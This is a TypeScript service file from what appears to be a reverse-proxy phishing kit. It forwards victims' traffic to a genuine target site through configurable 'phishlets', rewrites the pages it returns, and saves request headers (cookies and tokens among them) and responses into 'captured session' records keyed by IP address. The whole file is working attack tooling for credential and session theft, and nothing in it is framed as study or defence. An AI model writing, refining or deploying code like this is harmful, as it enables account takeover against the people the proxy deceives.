import http from 'http';
import httpProxy from 'http-proxy';
import { Phishlet } from '../entities';
import { AppDataSource } from '../data-source';
import { CapturedSession, ProxyLog } from '../entities';

class ProxyService {
    private proxy: httpProxy;

    constructor() {
        this.proxy = httpProxy.createProxyServer({});
    }

    async handleRequest(req: http.IncomingMessage, res: http.ServerResponse, phishlet: Phishlet): Promise<void> {
        const session = await this.findOrCreateSession(req, phishlet);

        this.proxy.web(req, res, {
            target: phishlet.targetUrl,
            changeOrigin: true,
            selfHandleResponse: true,
        });

        this.proxy.on('proxyRes', async (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', (chunk) => {
                body += chunk;
            });
            proxyRes.on('end', async () => {
                const rewrittenBody = this.rewriteContent(body, phishlet);
                await this.logRequest(session, req, proxyRes, rewrittenBody);
                res.end(rewrittenBody);
            });
        });
    }

    private async findOrCreateSession(req: http.IncomingMessage, phishlet: Phishlet): Promise<CapturedSession> {
        const sessionRepo = AppDataSource.getRepository(CapturedSession);
        // This is a simplified session management. A real implementation would use cookies.
        const ipAddress = req.socket.remoteAddress || 'unknown';
        let session = await sessionRepo.findOne({ where: { ipAddress, phishletId: phishlet.id } });
        if (!session) {
            session = new CapturedSession();
            session.phishletId = phishlet.id;
            session.ipAddress = ipAddress;
            session.capturedData = {};
            await sessionRepo.save(session);
        }
        return session;
    }

    private rewriteContent(body: string, phishlet: Phishlet): string {
        let rewrittenBody = body;
        if (phishlet.rewriteRules) {
            for (const rule of phishlet.rewriteRules) {
                rewrittenBody = rewrittenBody.replace(new RegExp(rule.from, 'g'), rule.to);
            }
        }
        return rewrittenBody;
    }

    private async logRequest(session: CapturedSession, req: http.IncomingMessage, proxyRes: http.IncomingMessage, responseBody: string): Promise<void> {
        const logRepo = AppDataSource.getRepository(ProxyLog);
        const log = new ProxyLog();
        log.sessionId = session.id;
        log.method = req.method || 'unknown';
        log.url = req.url || 'unknown';
        log.requestHeaders = req.headers;
        log.responseStatusCode = proxyRes.statusCode || 0;
        log.responseHeaders = proxyRes.headers;
        log.responseBody = responseBody;
        await logRepo.save(log);
    }
}

export const proxyService = new ProxyService();
